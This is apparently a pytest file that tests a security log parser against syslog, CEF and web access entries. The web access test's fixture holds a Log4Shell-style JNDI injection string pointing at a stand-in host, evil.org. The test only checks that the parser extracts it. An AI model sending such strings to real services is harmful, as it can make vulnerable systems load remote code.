import pytest
from app.parsers.syslog_parser import LogParser


def test_parse_syslog_failed_auth():
    raw = "Oct 11 02:14:10 edge-server sshd[3101]: Failed password for invalid user admin from 198.51.100.44 port 38221 ssh2"
    events = LogParser.parse_stream(raw)
    assert len(events) == 1
    evt = events[0]
    assert evt.source_ip == "198.51.100.44"
    assert evt.user == "admin"
    assert evt.status == "FAILURE"
    assert evt.log_format == "syslog"


def test_parse_cef_format():
    raw = "CEF:0|Security|Firewall|1.0|100|Auth Fail|5|src=10.20.30.40 dst=10.0.0.1 suser=root msg=denied"
    events = LogParser.parse_stream(raw)
    assert len(events) == 1
    evt = events[0]
    assert evt.source_ip == "10.20.30.40"
    assert evt.dest_ip == "10.0.0.1"
    assert evt.user == "root"
    assert evt.status == "FAILURE"


def test_parse_web_access_exploit():
    raw = '203.0.113.88 - - [14/Nov/2024:08:12:01 +0000] "GET /login?q=${jndi:ldap://evil.org} HTTP/1.1" 400 482'
    events = LogParser.parse_stream(raw)
    assert len(events) == 1
    evt = events[0]
    assert evt.source_ip == "203.0.113.88"
    assert evt.payload == "/login?q=${jndi:ldap://evil.org}"
    assert evt.status == "FAILURE"

